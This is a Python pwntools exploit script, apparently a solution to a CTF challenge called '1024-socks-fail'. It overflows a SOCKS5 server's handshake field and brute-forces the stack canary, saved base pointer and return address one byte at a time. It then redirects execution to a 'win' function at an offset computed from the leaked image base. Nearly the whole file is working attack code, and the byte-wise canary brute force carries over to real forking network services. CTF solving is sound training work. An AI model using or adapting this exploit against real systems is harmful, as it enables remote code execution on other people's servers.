#!/usr/bin/env python3

import pwn

host = "c2347e82ca384337d9b535b8-1024-socks-fail.challenges.dhm-ctf.de"
port = 443
ssl = True

TIMEOUT=0.03 # for LAN infrastructure this is enough


def try_conn(payload):
    with pwn.remote(host, port, ssl=ssl) as r:
        r.send(pwn.p16(5 + 0x100 * len(payload)))

        r.send(payload)

        (r.recv(2)) # handshake response

        r.send(b"\x01\x01\x01\x01")# ipv4
        r.send(b"\x7f\x00\x00\x01")# ip localhost
        r.send(b"\x04\x00")        # port 1024

        r.recv(10) # handshake response

        r.send(pwn.p16(0x0105)+ b"\x01")

        _r = (r.recv(2, timeout=TIMEOUT))
    return bool(_r)


payload = b'\x00' + 0x87*b'a'

known = b''
payload += known
for i in range(0x28-len(known)):
    for v in range(256):
        print(v)
        bv = bytes([v])
        _payload = payload + bv

        r = try_conn(_payload)

        if r:
            payload += bv
            print(payload[-(i+1):])
            break

canary = pwn.u64(payload[-0x28:-0x20])
rbp = pwn.u64(payload[-0x10:-0x8])
ret = pwn.u64(payload[-0x8:])

print(f'[+] canary: 0x{canary:x}')
print(f'[+] rbp: 0x{rbp:x}')
print(f'[+] ret: 0x{ret:x}')
print(payload)

# As win is only different in the least significant byte and is lower than the actual return address, we can be sure that win was already called,
# but in case win would not be, we'd have to do the following:
image_base = (ret & ~0xfff) - 0x1000 
print(f'[+] image_base: 0x{image_base:x}')
win = image_base + 0x1f23

payload = payload[:-8] + pwn.p64(win)
with pwn.remote(host, port,ssl=True) as r:
    r.send(pwn.p16(5 + 0x100 * len(payload)))

    r.send(payload)

    (r.recv(2))

    r.send(b"\x01\x01\x01\x01")# ipv4
    r.send(b"\x7f\x00\x00\x01")# ip localhost
    r.send(b"\x04\x00")        # port 1024
    r.recv(10) # handshake response

    r.send(pwn.p16(0x0105)+ b"\x01")
